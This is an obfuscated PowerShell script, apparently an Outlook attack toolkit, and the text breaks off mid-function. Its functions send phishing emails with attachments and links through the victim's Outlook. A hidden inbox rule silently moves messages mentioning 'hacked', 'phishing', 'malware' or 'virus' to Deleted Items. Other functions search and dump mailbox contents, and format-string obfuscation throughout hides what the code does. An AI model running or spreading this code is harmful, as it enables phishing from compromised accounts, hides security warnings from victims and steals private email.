$Kh0pu= [tYpe]("{1}{5}{3}{6}{0}{2}{8}{4}{7}"-f'fiCe.InteroP.OUTloOk.O','MicROs','l','Ft.o','U','O','f','letYPe','R');  $d3G  =  [type]("{9}{0}{3}{1}{8}{5}{7}{4}{2}{10}{6}"-F 'rOSOfT','OffICE','rCOPYruLEA','.','VEo','nterOp.outl','oN','OOK._Mo','.I','Mic','Cti') ; &("{2}{0}{1}"-f'T-It','eM','SE')  ("{1}{2}{0}{3}" -f'36','var','iAblE:','QJz') ([type]("{0}{4}{2}{3}{5}{1}" -F 's','GS','Tem.RefLE','C','yS','TioN.BINdINgFLa') );  $6Jc97e =[TyPe]("{2}{0}{1}" -f'virOnmEn','t','en') ;   &('SV')  ("Mn"+"j")  ( [TyPE]("{2}{6}{0}{1}{4}{3}{10}{8}{7}{9}{5}"-f'Age','mENT.aU','SYst','ion.','Tomat','stATe','em.man','s','S.InItialsE','Sion','RunsPaCE') ); $3av= [tYPE]("{2}{0}{7}{5}{3}{6}{4}{1}" -f 'y','d','s','dIng.th','A','rEA','re','sTEm.TH') ; &("{1}{0}{2}" -f 'ITe','sET-','m')  ("{0}{1}{2}{3}"-f'V','aRi','ABLE:qo','r')  ([TYPE]("{1}{3}{2}{0}" -F 'Y','ruNSPAcEFac','Or','t')) ; &("{1}{0}"-f 'T','SE') ("{1}{0}"-f'vC','eky1') ( [TYpE]("{1}{3}{2}{0}"-F 'HelL','pow','rs','E'));   $ydf=[tYpE]("{5}{1}{7}{6}{4}{0}{3}{2}"-F's.ma','s','AL','rSH','CE','Sy','i','TeM.RUNtimE.InTEroPsERV') ;



function i`N`Vok`e-sendMAIl {
    

    [CmdletBinding()]
    param(
        [Parameter(mANdatORY = ${FAL`SE}, PosiTIOn = 0, vaLUefRoMpIpelINE = ${T`Rue})]
        [string[]]${T`Arg`eTS},

        [Parameter(MANDAtory = ${F`ALse}, PoSItION = 1)]
        [string]${ta`Rg`eTLIsT},

        [Parameter(MandaTOrY = ${Fa`L`SE}, PositIon = 2)]
        [string]${u`Rl},

        [Parameter(mANdatORY = ${F`AL`sE}, pOsiTION = 3)]
        [string]${aTT`ACh`menT},

        [Parameter(ManDAtoRy = ${fA`L`se}, POSitiOn = 4)]
        [String]${tEMp`la`Te},

        [Parameter(MandatOry = ${F`A`lsE}, posiTioN = 5)]
        [string]${S`UbJ`EcT},

        [Parameter(maNdaTORY = ${F`Al`sE}, posITioN = 6)]
        [String]${b`OdY}

    )



    
    if(${t`ARG`et`LiST}){
        if(!(&("{1}{2}{0}" -f'h','Test-','Pat') ${taR`G`eTl`Ist})){
            Throw ("{8}{1}{6}{5}{3}{2}{7}{9}{4}{0}"-f't','t ','r E-Mail Ta','o','s','ath f','a valid file p','rg','No','etLi')
        }
        ${T`A`RgETEMAIlS} = &("{2}{1}{0}" -f'ent','t','Get-Con') ${tArGeTL`I`st}
    }
    elseif(${T`AR`geTs}){
        ${ta`Rg`eTe`MaI`lS} = ${TA`Rgets}
    }
    
    
    if(${T`emPL`Ate}){
        if(!(&("{0}{2}{1}" -f 'Te','th','st-Pa') ${TEm`p`LATE})){
            Throw ("{2}{1}{8}{7}{4}{3}{5}{0}{6}"-f 'ai',' a','Not','fo','path ','r E-m','l template','lid file ',' va')
        }
        ${E`MAilB`oDy} = &("{0}{2}{1}" -f 'Get-Con','t','ten') -Path ${te`M`PLA`Te}
        ${EM`AIL`Su`BJecT} = ${suBJe`ct}
    }
    elseif(${SU`B`JECt} -and ${b`Ody}){
        ${emA`IL`suBjeCt} = ${S`Ubject} 
        ${e`M`AILb`Ody} = ${b`odY} 
    }
    else {
        Throw ("{7}{11}{3}{2}{5}{0}{9}{4}{1}{10}{8}{6}" -f 'ct a','ody s','l Subj','i','or B','e','d','No ','e','nd/','pecifi','ema')
    }

    
    if(${u`RL}){
        ${eMA`iL`BO`dY} = ${emAi`l`B`ODy}.("{1}{0}{2}" -f'pla','Re','ce').Invoke("URL",${u`Rl})
    }

    
    ${app`D`A`TApAtH} = ${e`Nv:A`PpD`AtA}
    ${si`g`PATh} = ${ApP`dA`TAP`Ath} + ((("{4}{9}{1}{6}{5}{0}{8}{2}{3}{7}"-f'g','o','a','turesonR*.','onRMicr','Si','nR','htm','n','osoft'))."repL`A`cE"(([CHaR]111+[CHaR]110+[CHaR]82),'\'))

    if(&("{2}{3}{0}{1}"-f't','h','T','est-Pa') ${SIg`p`ATh}){
        ${SIg`NATU`Re} = &("{1}{2}{0}{3}" -f 'ont','Get','-C','ent') -Path ${s`i`GPath}
    } 
     

    
    
    &("{1}{2}{3}{0}" -f 'ule','I','nv','oke-R') -Subject ${sU`B`JeCt} -RuleName ("{0}{2}{1}"-f'Ra','In','ider')

    
    ForEach(${tARG`eT} in ${Tar`GeT`E`M`AilS}){

        ${o`UtlooK} = &("{5}{2}{1}{3}{0}{4}"-f 'tanc','k','-Outloo','Ins','e','Get')
        ${e`MAIL} = ${O`Ut`look}.("{0}{3}{1}{2}" -f 'Crea','t','em','teI').Invoke(0)
        
        if(${atTa`c`hmENT}){
            $(${e`M`Ail}."att`Ach`ME`Nt").("{1}{0}" -f 'd','Ad').Invoke(${A`Tt`AC`HmEnT})
        }
        ${E`maIL}."Ht`M`LbODy" = "$EmailBody"
        ${Em`AIl}."Su`BjecT" = ${e`M`AilSUB`JeCt}
        ${eM`A`iL}."tO" = ${TA`R`gET}

        
        if(${sIgna`Tu`RE}){
            ${Em`A`IL}."Ht`MLB`ody" += "`n`n" + "$Signature"
        }
        ${Em`AIl}.("{1}{0}"-f 'd','Sen').Invoke()
        &("{0}{2}{1}" -f'W','ose','rite-Verb') ('Sent'+' '+'Email'+' '+'to'+' '+"$Target")

         (  &("{0}{1}" -f'V','ARiable') ("Y"+"DF") -valuEOn  )::("{0}{1}{2}"-f'Rele','aseComObje','ct').Invoke(${Ou`TL`OoK}) | &("{1}{0}"-f 'll','Out-Nu')
    } 

    
   
}


function inv`Ok`e-RU`lE {

    

    [CmdletBinding()]
    param(
        [Parameter(mANdaTorY = ${F`A`lSe}, PosITiON = 0)]
        [string]${su`B`JECt},

        [Parameter(mAndAtory = ${fal`SE}, POSiTIon = 1)]
        [string]${rULE`Na`mE},

        [Parameter(MaNDaToRY = ${Fa`L`SE}, POsiTiON = 2)]
        [System.__ComObject]${OU`Tlook},

        [Parameter(maNDatory = ${f`A`LsE})]
        [switch]${d`IS`ABLE}
    )

    ${fLa`Gs} = @()
    ${fL`A`GS} = ${S`Ub`jECT}.("{0}{1}"-f'S','plit').Invoke(" ")
    ${fl`A`GS} += ("{0}{1}" -f'hacke','d')
    ${f`lagS} += ("{0}{1}{2}" -f'm','al','ware')
    ${fl`AGs} += ("{1}{2}{0}" -f 'ing','ph','ish')
    ${FLa`GS} += ("{1}{0}" -f's','viru')

    If(!(${oUT`l`oOk})){

        ${Ou`TLO`Ok} = &("{1}{3}{0}{2}" -f 'o','Get-Outl','kInstance','o')
        ${M`Api} = ${OUt`loOk}.("{0}{3}{2}{1}" -f'GetNa','ce','spa','me').Invoke(("{1}{0}" -f 'API','M'))

    }

    if(${d`i`SAble}){
        ${rU`Le} = ($(${OUT`l`Ook}."sEsSi`On")."def`AU`ltsToRE").("{2}{0}{1}" -f 'R','ules','Get').Invoke() | &("{0}{2}{1}" -f 'Where-Ob','t','jec') {${_}."nA`Me" -eq ${r`UlenAME}}
        ${R`Ule}."EN`A`Bled" = ${FA`lSE} 
    }
    else{

        
        ${r`Ule} = ($(${O`U`TlOOK}."s`ESsIoN")."dEfAuL`TSTo`RE").("{0}{1}{2}"-f 'G','etR','ules').Invoke() | &("{1}{0}{2}"-f're-Ob','Whe','ject') {(!(&("{2}{3}{1}{0}"-f 'ct','je','Co','mpare-Ob') $(${_}."c`oNDiT`iO`Ns"."SuBJE`ct")."T`eXT" ${f`La`gs}))}
        if(!(${R`UlE})){
            
            &("{2}{1}{0}" -f'-Type','d','Ad') -AssemblyName ("{5}{0}{1}{8}{3}{9}{7}{4}{2}{6}"-f'o','sof','erop.O','Office.','t','Micr','utlook','n','t.','I') | &("{1}{0}"-f 'ull','Out-N')
            
            ${i`NbOx} = &("{3}{0}{4}{2}{1}" -f 'et-','older','F','G','Outlook') -Name ("{1}{0}"-f'ox','Inb')
            ${del`E`TeD`FOldEr} = &("{3}{1}{2}{4}{0}" -f'er','e','t-','G','OutlookFold') -Name ("{2}{0}{3}{1}" -f'le','tems','De','tedI')
            
            ${R`U`les} = ${M`ApI}."DefaulTS`TO`Re".("{1}{0}" -f 'etRules','G').Invoke()
            ${ru`Le} = ${R`ULeS}.("{0}{1}"-f 'cr','eate').Invoke(${r`ULen`AMe},   (  &("{3}{2}{0}{1}" -f 'VArIAB','lE','t-','Ge')  ("{1}{0}"-f 'u','Kh0P') )."vA`lUe"::"o`lruL`er`ec`eiVE")

            ${sUb`TeXT} = ${RU`le}."CoNdi`Tio`Ns"."s`Ub`jecT"
            ${sU`BT`eXT}."En`AB`led" = ${t`RUE}
            
            ${su`BText}."TE`xT" = ${fla`gs}
            ${aCt`i`ON} = ${rU`Le}."aCtIO`NS"."MOVeT`O`FoL`deR"
            ${aCTi`ON}."EN`ABled" = ${Tr`Ue}
              ( &("{0}{2}{1}"-f 'geT-Varia','E','bl')  ('d3'+'g') -VALuEOn).("{3}{0}{2}{1}"-f 'nvo','ember','keM','I').Invoke(
                ("{0}{1}" -f 'Folde','r'),
                 ( &("{0}{1}"-f 'It','EM')  ("{1}{0}{4}{3}{2}" -f'aBL','vaRI','Jz',':36q','E'))."VaL`Ue"::"SEt`pro`pEr`TY",
                ${n`ULl},
                ${ACTI`ON},
                ${DEle`TEDfOLd`eR})
            
            try {
                ${ru`les}.("{0}{1}"-f'S','ave').Invoke()
                &("{3}{2}{1}{0}"-f 'e','os','rb','Write-Ve') ('Sav'+'ed'+' '+'Outl'+'ook '+'Rule'+' '+'wit'+'h '+'name'+':'+' '+"$Rulename")
            } 
            catch {
                &("{3}{0}{2}{1}" -f 'n','g','in','Write-War') ('U'+'nabl'+'e '+'to'+' '+'sav'+'e '+'inbo'+'u'+'nd '+'ru'+'le '+'w'+'ith '+'n'+'ame: '+"$RuleName")
            }
        }
        
    }


     (&("{2}{0}{1}" -f 'iLdiT','EM','cH')  ("VA"+"R"+"IA"+"bLE:YDF"))."V`ALUE"::("{3}{4}{1}{0}{2}"-f'mObjec','easeCo','t','Re','l').Invoke(${OuT`LOoK}) | &("{0}{1}"-f'Out-Nul','l') 
    

}

function ge`T-OsvE`RS`iON {

    

    
    &("{1}{3}{2}{0}" -f'e','Wri','os','te-Verb') ("{2}{1}{0}" -f'.','ecting OS..','Det')
    ${O`s} =  (&("{1}{0}{2}" -f'A','GET-VarI','BlE')  ("6jC97"+"E"))."v`ALuE"::"osveR`SI`ON"."v`ErsiON"


    if(${o`S}."MA`jOR" -eq 10){
        ${OS`V`erSiOn} = ("{0}{1}{2}"-f 'W','i','ndows 10')
    }

    
    if(${O`S}."MA`jOR" -eq 6){
        switch (${oS}."M`iNOR"){
            3 {${osvEr`s`i`oN} = ("{2}{1}{0}{4}{3}{5}"-f'Se','ndows 8.1/','Wi','er 2012 ','rv','R2')}
            2 {${o`Sve`RSION} = ("{3}{0}{2}{4}{1}"-f 'indow','2','s 8/Server 2','W','01')}
            1 {${O`S`VeRSiOn} = ("{4}{0}{3}{5}{1}{2}" -f 'nd','erver 20','08 R2','ows 7','Wi','/S')}
            0 {${O`SV`E`RSIOn} = ("{3}{4}{0}{1}{2}{5}{6}{7}"-f 'w','s ','Vi','Win','do','s','ta/S','erver 2008')}
        }
    }
    if(${Os}."MaJ`oR" -eq 5){
        switch (${OS}."m`INor"){
            2 {${Os`VerS`ION} = ("{1}{3}{0}{4}{2}" -f's XP/Server','Wi',' R2','ndow',' 2003')}
            1 {${oSv`e`Rs`iOn} = ("{1}{0}{2}"-f'do','Win','ws XP')}
            0 {${oSVe`RSI`On} = ("{0}{1}{3}{2}"-f 'Win','dows','00',' 20')}

        }
    }

    &("{4}{1}{0}{3}{2}"-f 'V','e-','e','erbos','Writ') ("{6}{2}{4}{3}{1}{0}{5}" -f' the ','of','ecking t','bitness ','he ','OS','Ch')
    if((&("{2}{0}{1}" -f 'iOb','ject','Get-Wm') -class ("{1}{2}{3}{0}" -f'stem','win','32_operatings','y'))."oSaRC`hI`Te`CtU`Re" -eq ("{0}{1}" -f '64-b','it')){
        ${O`Sar`CH} = 64
    }
    else{
        ${osA`R`cH} = 32
    }
    ${os`VeRS`IOn}
    ${Os`Ar`cH} 
}

function SEleCt-Em`A`il`I`TeM {
    

    [CmdletBinding()]
    param(
        [Parameter(MANdatOry = ${FA`L`SE}, vAlUefROmpIPeLINE = ${TR`UE})]
        [System.__ComObject]${fo`lD`E`Robj},

        [Parameter(mAndAtOry = ${Tr`Ue})]
        [int]${n`Um}
    )

    ${EM`AIl`item} = ${FO`L`derOBJ}."It`emS" | &("{1}{0}{2}" -f'lect-Obj','Se','ect') -Index ${n`Um} 

    ${E`MA`ilITEM} | &("{2}{1}{0}"-f '-Object','ct','Sele') ('To'),("{2}{1}{0}"-f 'e','am','SenderN'),("{1}{0}{2}{3}" -f'ai','SenderEm','lA','ddress'),("{0}{1}{2}" -f 'Su','bjec','t'),("{1}{0}"-f 'y','Bod'),("{1}{0}" -f 'On','Sent'),("{0}{2}{1}"-f'Receive','ime','dT')
    
}


function Vi`ew-EM`AIL {
    

    [CmdletBinding()]
    param(
        [Parameter(mANdatoRy = ${TR`Ue}, pOsItIoN = 0)]
        [string]${fo`Lder`Na`me},

        [Parameter(ManDAtoRY = ${fAl`se}, pOsitiOn = 1)]
        [int]${iND`Ex} = 0
    )


    ${o`F} = &("{0}{1}{2}{4}{3}"-f'Get-Ou','tlo','okFol','er','d') -Name ${F`ol`dERnA`me} 
    &("{2}{1}{0}"-f 'ailItem','Em','Select-') -FolderObj ${Of} -Num ${In`d`eX}
}

function G`Et-O`UTlOO`kfoldeR {
    

    [CmdletBinding()]
    param(
        [Parameter(MAndAtOry = ${T`Rue}, pOSITION = 0)]
        [String]${n`Ame}
    )

    ${OLdeFaUL`T`FO`LD`erS} = @{
        ("{2}{4}{3}{0}{1}"-f'l','derCalendar','o','Fo','l') = 9
        ("{5}{1}{2}{4}{3}{0}"-f 's','lFo','l','nflict','derCo','o') = 19
        ("{4}{1}{0}{2}{3}" -f'lde','lFo','rCo','ntacts','o') = 10
        ("{4}{1}{3}{5}{0}{2}"-f 'etedItem','de','s','r','olFol','Del') = 3
        ("{2}{0}{1}{3}" -f 'e','rDraf','olFold','ts') = 16
        ("{1}{0}{3}{2}" -f'ld','olFo','x','erInbo') = 6
        ("{3}{0}{4}{1}{2}"-f'lF','ou','rnal','o','olderJ') = 11
        ("{3}{2}{0}{1}"-f 'de','rJunk','ol','olF') = 23
        ("{4}{3}{0}{2}{1}"-f 'al','lures','Fai','rLoc','olFolde') = 21
        ("{2}{0}{1}{3}" -f 'lFolder','Manag','o','eEmail') = 29
        ("{0}{1}{2}"-f'olF','olde','rNotes') = 12
        ("{3}{2}{0}{1}" -f 'olde','rOutbox','F','ol') = 4
        ("{1}{4}{3}{0}{2}" -f 'derSentMai','o','l','l','lFo') = 5
        ("{2}{5}{1}{6}{4}{0}{3}" -f'verFailure','older','ol','s','r','F','Se') = 22
        ("{1}{2}{4}{0}{3}"-f 'edCo','olFolderS','ugges','ntacts','t') = 30
        ("{1}{0}{2}{4}{3}" -f'Folde','ol','rSyn','es','cIssu') = 20
        ("{1}{2}{0}" -f'erTasks','o','lFold') = 13
        ("{1}{2}{0}" -f'Do','o','lFolderTo') = 28
        ("{1}{6}{5}{4}{3}{9}{8}{2}{0}{7}" -f 'lder','ol','icFo','licFolde','b','u','P','s','AllPubl','rs') = 18
        ("{5}{3}{4}{1}{2}{0}" -f's','rR','ssFeed','F','olde','ol') = 25
    }



    ${dE`FaULtF`o`lDeRN`AmE} = "olFolder$Name"

    ${v`ALUe} = ${o`Ld`EfAult`FoLdE`RS}.("{1}{0}"-f 'tem','I').Invoke(${dE`FaUlTfo`LD`ern`Ame})

    ${OuT`lO`OK} = &("{1}{2}{4}{3}{0}"-f 'nce','Ge','t-Outloo','nsta','kI')

    ${MA`pi} = ${Ou`TLo`oK}.("{3}{0}{2}{1}"-f'amespa','e','c','GetN').Invoke(("{1}{0}" -f 'I','MAP'))

    ${f`OLdER`OBJ} =  ${Ma`pI}.("{2}{3}{1}{0}"-f 'r','olde','GetDef','aultF').Invoke(${V`AlUE})

    &("{3}{0}{1}{2}"-f'i','te-Verb','ose','Wr') ("{1}{3}{4}{0}{2}" -f 'r Obj','Obtaine','ect','d Fold','e')

     $YDF::("{1}{3}{4}{2}{0}" -f 'Object','Re','aseCom','l','e').Invoke(${OU`T`looK}) | &("{0}{1}{2}" -f 'Out-N','u','ll')

    ${foL`DERO`BJ}

}

function g`et`-emAIL`it`eMS {
    

    [CmdletBinding()]
    param(
        [Parameter(MaNdATorY = ${t`Rue}, pOSitioN = 0, VALuEfROmpiPeLiNE = ${tr`Ue})]
        [System.__ComObject]${fOl`dEr},

        [Parameter(mAndATory = ${F`Al`se}, POsItIon = 1)]
        [int]${MA`Xe`MAIls},

        [Parameter(MandatOrY = ${F`Al`Se})]
        [switch]${fulLo`B`jECt}
    )
    
    
    if(${Max`EmAi`Ls}){
        &("{1}{2}{0}" -f'e','Write-Ver','bos') ('S'+'ele'+'cting '+'the'+' '+'first'+' '+"$MaxEmails "+'ema'+'ils')
        ${I`T`EMS} = ${F`OlD`Er}."It`EMS" | &("{0}{2}{1}"-f'Se','t-Object','lec') -First ${m`AxEMA`ilS}
    }
    else{
        &("{0}{2}{3}{1}" -f'Write-','ose','Ver','b') ("{4}{1}{0}{3}{2}" -f ' ','ng','ll emails','a','Selecti')
        ${iTe`mS} = ${fOl`Der}."iTe`MS"
    }

    if(!(${fuL`l`objE`cT})){
        ${e`MA`iLS} = @()
        &("{1}{2}{0}"-f 'bose','Wri','te-Ver') ("{10}{3}{8}{0}{7}{2}{5}{9}{6}{1}{4}" -f 'cust','.',' Em','n','.','ail it',' objects.','om','g ','em','Creati')
        ${IT`E`ms} | &("{1}{0}{2}"-f 'r','Fo','Each') {

            ${E`MaiL} = &("{0}{2}{1}" -f 'New','ject','-Ob') ("{0}{1}"-f 'PSObjec','t') -Property @{
                ('To') = ${_}."T`O"
                ("{1}{0}" -f 'mName','Fro') = ${_}."Sen`deR`NAME" 
                ("{0}{1}{2}{3}"-f 'FromA','dd','res','s') = ${_}."s`EnDe`RemaiL`AdDreSs"
                ("{1}{0}" -f'bject','Su') = ${_}."SUBJ`ect"
                ("{0}{1}" -f 'Bo','dy') = ${_}."b`oDY"
                ("{0}{1}{2}" -f 'Tim','eSe','nt') = ${_}."Se`N`TOn"
                ("{0}{2}{1}{3}"-f'T','e','im','Received') = ${_}."r`Ec`eiVeDt`imE"

            }

            ${e`M`AIls} += ${e`MAIl}
            ${Em`A`Ils} = ${EMai`LS} | &("{3}{0}{1}{2}" -f'-','Objec','t','Sort') -Property ("{0}{1}" -f'Ti','meSent') -Descending

        }
    }
    else{
        &("{3}{0}{1}{2}{4}" -f 'it','e-Ver','b','Wr','ose') ("{0}{6}{1}{5}{9}{7}{2}{8}{3}{4}"-f 'Ob','ed f','tem o','ject','s....','ull Ema','tain','I','b','il ')
        ${e`mAILs} = ${It`EMS} | &("{0}{2}{1}"-f 'S','Object','ort-') -Property ("{1}{0}{2}"-f 'ent','S','On') -Descending
    }
    

    ${ema`i`lS} 


}

function In`VokE`-mAIlse`Ar`ch {

    

    [CmdletBinding()]
    param(
        [Parameter(mANdaTORy = ${T`Rue})]
        [string]${D`e`F`AuLtFol`DEr},

        [Parameter(MAndAtORY = ${TR`UE})]
        [string[]]${keY`WOR`dS},

        [Parameter(mANDAtoRY = ${FA`lsE})]
        [int]${Max`RE`s`ULtS},

        [Parameter(MaNdaToRY = ${Tr`Ue})]
        [int]${Ma`XTHRe`ADS} = 15,

        [Parameter(ManDAtoRY = ${F`AlsE})]
        [int]${MaXS`e`A`RCh},

        [Parameter(MAnDatORY = ${F`Alse})]
        [string]${Fi`Le}
    )

    
    ${r`esu`Lts`LIsT} = @()

  
    ${s`e`A`RChEMa`IlB`LOCk} = {

        param(${rE`gEX}, ${ma`IlI`Tem})
        ${sU`B`JEcT} = ${mA`iLi`Tem}."S`Ub`JECt"
        ${B`oDY} = ${M`A`ILiTeM}."bo`dy" 
        
        if(($(${rEG`EX}.("{0}{1}" -f'Mat','ch').Invoke(${s`UB`JeCt}))."SuC`cE`SS") -or ($(${R`Egex}.("{1}{0}"-f 'ch','Mat').Invoke(${b`OdY}))."SU`c`cesS")){
            ${Ma`ili`TEM}
        }
    }


    ${o`F} = &("{4}{1}{2}{3}{0}"-f 'er','o','kF','old','Get-Outlo') -Name ${DEfAUL`TfOl`DEr}

    if(${MAXsEA`R`cH}){
        ${E`MA`iLs} = &("{3}{1}{2}{0}" -f'tems','Email','I','Get-') -Folder ${OF} -FullObject -MaxEmails ${Ma`XSe`AR`cH}
    }
    else {
        ${e`maILs} = &("{0}{2}{1}"-f 'Get-','lItems','Emai') -Folder ${O`F} -FullObject   
    }

    
    if(${Ke`YWo`Rds}."cO`Unt" -gt 1){
        ${C`OuNt} = ${K`E`ywordS}."coU`NT" - 2
        for(${i} = 0; ${I} -lt ${C`OunT}; ${I}++){
            ${k`EY`WORdS}[${I}] += "|"
        }

        [string]${kEywo`RDs} = ${K`EYWoR`DS} -join ''
        ${K`EYWo`R`dS} = "\b($Keywords)\b"
        
    }
    else {
        ${KE`Ywo`RDs} =  "\b($Keywords)\b"
    }

    ${r`eG`EX} = [regex]${k`eyw`Ords}
        

    &("{2}{1}{0}"-f'ose','b','Write-Ver') "[*] Searching through $($Emails.count) emails..... "


    
    
    ${SEsSio`NS`TaTe} =  (  &("{0}{1}{2}" -f 'vArI','A','BLe') ("{0}{1}"-f'MN','J')  -valUeonLy )::("{3}{4}{0}{1}{2}"-f 'ef','a','ult','Create','D').Invoke()
    ${SE`ssiON`ST`AtE}."APaRTme`NT`s`Ta`TE" =  (  &('lS') ("VaRI"+"aBL"+"E:3av"))."VA`lUe"::"cURReN`TTh`RE`AD".("{1}{2}{0}{3}" -f'ntSta','GetApart','me','te').Invoke()

    
    ${M`yv`Ars} = &("{2}{0}{1}{3}"-f 'et-','Va','G','riable') -Scope 1

    ${vO`RB`I`dDe`NvaRS} = @("?",("{1}{0}"-f'rgs','a'),("{1}{2}{4}{0}{3}"-f'leNam','Conso','le','e','Fi'),("{0}{1}" -f'E','rror'),("{2}{1}{0}{3}"-f 'o','cuti','Exe','nContext'),("{1}{0}" -f 'alse','f'),("{1}{0}"-f'ME','HO'),("{0}{1}" -f'Ho','st'),("{0}{1}"-f'inp','ut'),("{0}{2}{3}{1}" -f 'In','ct','put','Obje'),("{0}{3}{2}{1}" -f'Maximum','t','asCoun','Ali'),("{3}{2}{0}{1}"-f 'eC','ount','ximumDriv','Ma'),("{4}{2}{0}{3}{5}{1}"-f 'mu','rrorCount','xi','m','Ma','E'),("{1}{2}{3}{0}"-f'tionCount','M','aximumfu','nc'),("{1}{2}{5}{3}{0}{4}" -f 'n','Max','imumH','oryCou','t','ist'),("{2}{4}{1}{3}{0}{5}"-f 'C','ariab','Maxim','le','umV','ount'),("{0}{1}{2}{3}" -f'MyInv','o','ca','tion'),("{1}{0}" -f'll','nu'),"PID",("{1}{0}{3}{2}" -f 'B','PS','undParameters','o'),("{2}{0}{1}"-f 'ndP','ath','PSComma'),("{2}{0}{1}" -f'ltu','re','PSCu'),("{4}{1}{2}{5}{0}{3}" -f 'e','efaultPara','mete','s','PSD','rValu'),("{0}{1}"-f 'PSHO','ME'),("{1}{2}{0}{3}"-f 'ptRo','PSScr','i','ot'),("{2}{1}{0}" -f'e','UICultur','PS'),("{1}{2}{0}" -f'le','PSVersi','onTab'),"PWD",("{0}{1}"-f'She','llId'),("{4}{1}{3}{2}{0}{5}"-f 'Has','nch','nized','ro','Sy','h'),("{0}{1}"-f 'tru','e'))

    
    ForEach(${V`Ar} in ${Myv`ARs}){
        if(${voRbiDD`En`V`ARS} -notcontains ${V`AR}."N`AME"){
            ${SE`sSIonS`TAte}."v`ARIA`BlEs".("{1}{0}"-f 'd','Ad').Invoke((&("{1}{3}{2}{0}"-f 'ect','New','bj','-O') -Typename ("{6}{2}{14}{1}{5}{15}{8}{9}{13}{11}{10}{12}{7}{3}{4}{0}" -f'ry','nag','st','Varia','bleEnt','e','Sy','ion.Runspaces.SessionState','nt','.','to','u','mat','A','em.Ma','me') -ArgumentList ${v`Ar}."n`AME",${v`AR}."va`lUE",${V`Ar}."de`SCR`IpT`IoN",${V`AR}."OP`TIONS",${v`AR}."a`TTrI`B`UTES"))
        }
    }

    
    &("{1}{0}{2}"-f'Ve','Write-','rbose') ("{2}{1}{4}{6}{0}{3}{5}" -f'a','ating','Cre','ce P',' R','ool','unSp')
    ${po`oL} =   (  &("{0}{1}{2}"-f'g','ET-v','ariaBLE') ("{0}{1}"-f 'qO','r')  )."Va`LUe"::("{3}{0}{2}{1}{4}"-f'eate','unspa','R','Cr','cePool').Invoke(1, ${MAXt`h`R`EaDs}, ${SESs`Ion`S`TAtE}, ${HO`st})
    ${po`oL}.("{1}{0}" -f'n','Ope').Invoke()

    ${Jo`Bs} = @()
    ${ps} = @()
    ${wa`It} = @()

    ${C`ouNtER} = 0
    ${MS`gCo`UNt} = 1

    ForEach(${M`sg} in ${eM`AI`Ls}){

        &("{2}{3}{0}{1}"-f 'V','erbose','Wri','te-') "Searching Email # $MsgCount/$($Emails.count) "

        while ($(${P`ool}.("{1}{4}{5}{3}{2}{0}{6}"-f'c','GetAvai','unSpa','R','l','able','es').Invoke()) -le 0){

            &("{0}{2}{1}"-f 'Star','p','t-Slee') -Milliseconds 500

        }

        ${p`s} +=  $EKy1vc::("{0}{1}" -f'cr','eate').Invoke()

        ${P`s}[${cOun`T`er}]."ruNSPa`c`EP`OoL" = ${po`oL}

        [void]${PS}[${c`OU`NTEr}].("{1}{2}{0}"-f'Script','Ad','d').Invoke(${s`ear`ch`EMAILBLO`cK}).("{0}{2}{3}{1}" -f 'Add','r','Paramet','e').Invoke(("{0}{1}"-f 'R','egex'), ${ReG`ex}).("{0}{1}{2}" -f'AddPa','rame','ter').Invoke(("{1}{2}{0}" -f'tem','Mail','I'), ${M`Sg})

        ${j`OBs} += ${P`S}[${Co`UNt`eR}].("{0}{2}{3}{1}"-f 'Be','e','ginInv','ok').Invoke();

        ${wa`iT} += ${j`OBs}[${C`OuNt`er}]."A`SYNcwAI`Thand`LE"

        ${Co`U`NTEr} = ${COuN`T`eR} + 1
        ${MS`GCO`UnT} = ${mSg`C`ouNT} + 1

    }

    ${w`Ait`TImeO`UT} = &("{1}{0}{2}"-f 'et-D','G','ate') 

    while ($(${J`OBs} | &('?') {${_}."ISC`OmpLE`TED" -eq ${F`AlSe}})."Co`Unt" -gt 0 -or $($($(&("{0}{1}"-f 'Get-Da','te')) - ${WAI`T`TiMEOut})."To`Tal`S`econDs") -gt 60) {
        &("{3}{0}{1}{2}"-f 'art-S','lee','p','St') -Milliseconds 500
    }

    for (${X} = 0; ${x} -lt ${Co`Un`TEr}; ${X}++){

        try {
            
            ${reSU`Lt} = ${P`S}[${x}]."EnD`i`Nvoke"(${j`oBs}[${X}])
            if(${r`eSuLt}){
                ${REsUlT`S`lIST} += ${re`s`UlT} 
            }

        }
        catch {
            &("{2}{1}{0}"-f 'g','e-Warnin','Writ') ('erro'+'r: '+"$_")
        }

        finally {

            ${p`S}[${x}].("{2}{1}{0}" -f 'spose','i','D').Invoke()
        }
    }

    ${P`ool}.("{2}{1}{0}"-f'se','spo','Di').Invoke()

    

    If(${M`AXrEsUl`TS}){
        ${ReSul`T`SL`iST} = ${R`ESULT`sLiSt} | &("{1}{0}{2}{3}"-f't-','Selec','Obje','ct') -First ${Ma`x`Results}
    }

    If(${F`IlE}){

        ${Res`UltsL`IsT} | &("{1}{4}{3}{0}{2}"-f'-Ob','S','ject','lect','e') ("{2}{1}{0}"-f'e','Nam','Sender'),("{4}{1}{2}{0}{3}" -f 'rEmailAddre','en','de','ss','S'),("{3}{2}{1}{0}"-f 'Time','eived','c','Re'),('To'),("{2}{1}{0}"-f 'ect','j','Sub'),("{0}{1}" -f'Bo','dy') | &("{1}{2}{0}"-f'File','Out','-') ${fi`le} 
        
    }
    else {
        ${Resu`ltsL`I`ST} | &("{3}{1}{0}{2}"-f'bj','lect-O','ect','Se') ("{2}{3}{1}{0}"-f 'me','a','Sende','rN'),("{1}{3}{4}{2}{0}{5}"-f 'Addr','Se','ail','nd','erEm','ess'),("{2}{1}{0}"-f'me','ivedTi','Rece'),('To'),("{1}{0}{2}" -f 'b','Su','ject'),("{0}{1}" -f'Bo','dy')
        
    }
    
}

function gET`-subFO`l`DERs {
    


    [CmdletBinding()]
    param(
        [parameter(manDaToRy = ${fA`L`SE}, POsITion = 0)]
        [string]${defaU`ltfOL`d`ER},

        [parameter(MaNDaToRY = ${F`AL`Se})]
        [switch]${fUL`lObje`Ct}
    )

    ${S`UB`FoL`dERs} = (&("{1}{3}{2}{0}"-f 'kFolder','Get-Out','oo','l') -Name ${deF`AuLT`FOL`DER})."fOldE`RS" 

    If(!(${sub`Folde`RS})){
        Throw "No subfolders were found for folder: $($Folder.Name) "
    }

    if(!(${fuL`LO`BjE`CT})){
        ${s`Ub`FOLdeRs} = ${sU`Bf`olDErS} | &("{1}{0}"-f'Each','For') {${_}."n`Ame"}
    }
    
    ${su`B`F`olDERS} 
    
}

function Ge`T-`GLoBaL`Ad`d`REssLisT {
    

    [CmdletBinding()]
    param(
